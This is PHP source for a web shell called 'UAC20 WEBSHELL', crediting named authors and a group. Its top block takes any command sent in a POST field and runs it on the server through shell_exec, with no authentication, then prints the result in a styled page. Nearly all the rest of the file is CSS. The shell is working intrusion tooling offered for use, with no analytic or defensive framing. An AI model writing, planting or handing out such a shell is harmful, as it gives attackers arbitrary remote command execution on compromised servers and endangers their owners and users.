<?php
// UAC 20 V1 WEBSHELL
// AUTHOR : MatrixTM26
// GitHub : https://github.com/MatrixTM26
// CO-AUTHORED: astronrx736 & UAC 20 GROUP

if (isset($_POST["COMMAND"]) && !empty($_POST["COMMAND"])) {
    $cmd = $_POST["COMMAND"];
    $output = shell_exec($cmd);
} ?>

<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta http-equiv="X-UA-Compatible" content="ie=edge">
	<title>UAC20 WEBSHELL</title>
	<style type="text/css" media="all">
		@import url("https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;700&family=Tourney:wght@400;500;600;700&display=swap");

		* {
		    margin: 0;
		    padding: 0;
		    box-sizing: border-box;
		}
		
		body {
		    min-height: 100vh;
		    background: #0a0a0a;
		    font-family: "Space Grotesk", sans-serif;
		    color: #ffffff;
		}
		
		.container {
		    width: 100%;
		    min-height: 100vh;
		    display: flex;
		    justify-content: center;
		    align-items: center;
		    padding: 20px;
		}
		
		.content {
		    width: 100%;
		    max-width: 1080px;
		    background: #141414;
		    border: 1px solid #2a2a2a;
		    border-radius: 18px;
		    padding: 35px 28px;
		    box-shadow: 0 0 30px rgba(255, 0, 0, 0.12);
		}
		
		.content h2 {
		    text-align: center;
		    margin-bottom: 25px;
		    color: #ff2b2b;
		    font-size: 28px;
		    font-weight: 700;
		    letter-spacing: 2px;
		    font-family: "Tourney", sans-serif;
		}
		
		form {
		    display: flex;
		    flex-direction: column;
		    gap: 16px;
		}
		
		form input[type="text"] {
		    width: 100%;
		    padding: 15px;
		    background: #0f0f0f;
		    border: 1px solid #303030;
		    border-radius: 12px;
		    color: #ffffff;
		    font-size: 15px;
		    outline: none;
		    transition: 0.3s;
		    font-family: "Space Grotesk", sans-serif;
		}
		
		form input[type="text"]:focus {
		    border-color: #ff2b2b;
		    box-shadow: 0 0 12px rgba(255, 43, 43, 0.25);
		}
		
		form input[type="submit"] {
		    width: 100%;
		    padding: 15px;
		    background: #ff1f1f;
		    border: none;
		    border-radius: 12px;
		    color: #ffffff;
		    font-size: 15px;
		    font-weight: 700;
		    cursor: pointer;
		    transition: 0.3s;
		    font-family: "Space Grotesk", sans-serif;
		}
		
		form input[type="submit"]:hover {
		    background: #d60000;
		}
		
		.output {
		    margin-top: 20px;
		    padding: 16px;
		    background: #0f0f0f;
		    border: 1px solid #2d2d2d;
		    border-left: 4px solid #ff2b2b;
		    border-radius: 12px;
		    color: #ffffff;
		    font-size: 14px;
		    line-height: 1.6;
		    overflow: auto;
		    word-break: break-word;
		    font-family: "Space Grotesk", sans-serif;
		}
		
		@media (max-width: 1080px) {
		    .content {
		        padding: 30px 22px;
		    }
		
		    .content h2 {
		        font-size: 32px;
		    }
		}
		
		@media (max-width: 768px) {
		    .content {
		        padding: 30px 22px;
		    }
		
		    .content h2 {
		        font-size: 24px;
		    }
		}
		
		@media (max-width: 480px) {
		    .content {
		        padding: 24px 18px;
		        border-radius: 14px;
		    }
		
		    .content h2 {
		        font-size: 20px;
		    }
		
		    form input[type="text"],
		    form input[type="submit"] {
		        padding: 14px;
		        font-size: 14px;
		    }
		
		    .output {
		        font-size: 13px;
		    }
		}

	</style>
</head>
<body>
	<div class="container">
		<div class="content">
			<h2>UAC20 WEBSHELL</h2>
			<form action="" method="POST" accept-charset="utf-8">
				<input type="text" name="COMMAND" value="" required autocomplete="off" />
				<input type="submit" value="ENTER" />
			</form>
			<?php if (!empty($output)): ?>
        	<div class="output">
            	<?php echo htmlspecialchars($output); ?>
        	</div>
    		<?php endif; ?>
		</div>
	</div>
</body>
</html>
